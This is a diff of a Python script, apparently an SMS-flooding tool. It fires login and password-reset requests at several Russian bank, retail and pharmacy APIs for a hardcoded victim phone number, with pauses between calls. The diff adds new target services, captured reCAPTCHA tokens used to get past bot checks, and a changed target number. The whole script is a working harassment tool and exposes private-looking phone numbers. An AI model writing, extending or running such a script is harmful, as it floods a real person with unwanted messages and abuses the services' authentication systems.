@@ -1,13 +1,14 @@
 import requests
+import time
 
-# print("Введите номер телефона без кода страны")
+# print("Введи номер телефона без кода страны")
 # phone=input()
 # print("Номер телефона " + phone)
-phone = '9991253348'
+phone = '9223702227'
+ts=5
 headers = {
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124",
     "Content-Type": "application/json", }
-
 
 def sunlight():
     sunlightHeaders = headers
@@ -28,7 +29,6 @@ def pyaterka():
     print(p.status_code)
     print(p.json())
 
-
 def mkb():
     mkbHeaders = headers
     mkbHeaders.update(
@@ -37,14 +37,30 @@ def mkb():
     mkb = requests.post('https://my.mkb-am.ru/api/auth/password/reset', headers=mkbHeaders, json={"login": mkbPhone})
     print(mkb.status_code)
     print(mkb.json())
-def mcdonalds():
-    mcdHeaders=headers
-    mcdHeaders.update({"Host":"site-api.mcdonalds.ru","Origin":"https://mcdonalds.ru"})
-    mcdPhone=phone
-    mcd=requests.post("https://site-api.mcdonalds.ru/api/v1/user/login/phone",headers=mcdHeaders,json={"number":"+79997854589","g-recaptcha-response":"03AGdBq27OPyEZwZGTLGh5AuLL4CwyfkdN9LiB6BwiHhVhI_G9gqw_A_Ff1O9wxUKYphC75FWI-mIfkvdGLdsoV42PY-qgGqH-PafQmDGLcWJ45Pm9meCKLtGHjirnax5Fd5CG7hLEsvjl3I9JGnZXovs60eXg1JydnvVES4CrJ4EsjdmRnTdPUEXAswNdNs4Z78IqvzU2lxCBl2EW8LTQBZC071sMgztgJ75ZHzaIOZEA7qHEb4Up6uJ8NaojfnnuVQckpLSbMPPEl-P0_jfv94juJm-D8sLr6XQHzlKxNcHJZlWy5aYmTvethgmCDH3mCUlWF2mg60Qdd7dnz1T60lz354ySwXVXpQnCSTbIK2h5zbTxjR6W-MCgfh6x0DEyIPX_xVou1UmILy8As3aRQFmaPz-jR7klxnnsjsHyPeChWU3AXGX14GkU6eC2lL3rZnYknzXf0mal"})
-    print(mcd.status_code)
-    print(mcd.json())
-mcdonalds()
+
+
+def karusel():
+    karHeaders=headers
+    karHeaders.update({"Host":"app.karusel.ru", "Origin":"https://karusel.ru"})
+    karPhone= "7" + phone
+    kar=requests.post("https://app.karusel.ru/api/v2/token/",headers=karHeaders, json={"phone": karPhone,"recaptcha_token":"03AGdBq255xknZF1jMw1N-O4w36uvaeyqFAeYk2x2MhYiDnLs31jnWYboOi1evSLHIrL7JSzXYjesrWMhv5sxvt2hJfEM2N3AXeAKjD135PpocJiEmrYWConWAg2XRGzUZp_rX-FgIoq2Y7qCyBcIdx1CW4KLzh6X_Xk2NvV3-F7L2jynBvXJNmpRL7DBsZZ5xCxLs4JYSfZS4UmPhd0yE-wGIgUtHb4Dz74PSCk61LJg8_bfpB-uo8xoEdgiCg6MeiPPWBjtCqZC_nBF-2zY93Vd64PQd7gAc4aJTd2O7iqGnKEdTPDvUex0B0sI2oHUNJ0m1Ggr0z3C9OWEPtr7l7S3zrgbiH7PZHtWbiuM2Y_VVPxs4aCedXDOWPF1kZ_EuZWYAhCN0iIwGrgJkHPnKl22HfyU149kpK1dTlz_fL_4BeJozTwv0atHwRbjGxYb7youdKp8fJmKe"})
+    print(kar.status_code)
+    print(kar.json())
+
+def aptekaru():
+    aptHeaders=headers
+    aptHeaders.update({"Host":"api.apteka.ru","Origin":"https://apteka.ru", "cityId":"5e57803249af4c0001d64407"})
+    aptPhone= "+7" + phone
+    apt=requests.post("https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d644070",headers=aptHeaders,json={"phone":aptPhone,"u":"1"})
+    print(apt.status_code,"aptekaru")
+    print(apt.json())
+
 mkb()
+time.sleep(ts)
 sunlight()
+time.sleep(ts)
 pyaterka()
+time.sleep(ts)
+aptekaru()
+time.sleep(ts)
+karusel()
